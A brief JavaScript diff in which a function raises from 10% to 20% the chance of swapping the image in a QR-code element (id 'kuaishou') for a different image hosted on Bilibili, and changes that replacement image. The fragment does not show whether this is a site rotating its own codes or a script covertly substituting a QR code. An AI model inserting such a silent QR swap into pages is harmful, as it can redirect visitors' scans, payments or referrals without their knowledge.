@@ -20,10 +20,10 @@ const replaceIt = () => {
                 return;
             }
 
-            const canDoIt = Math.random() < 0.1;
+            const canDoIt = Math.random() < 0.2;
             if (canDoIt) {
                 const erweimaDom = document.getElementById('kuaishou');
-                erweimaDom.setAttribute("src", 'https://article.biliimg.com/bfs/article/87462760e93e163f3ad42f7bb85058dc926c80cf.jpg');
+                erweimaDom.setAttribute("src", 'https://article.biliimg.com/bfs/article/27305a8b174d8cf7bf1f388c26c1647f8029a07f.jpg');
             }
         });
 
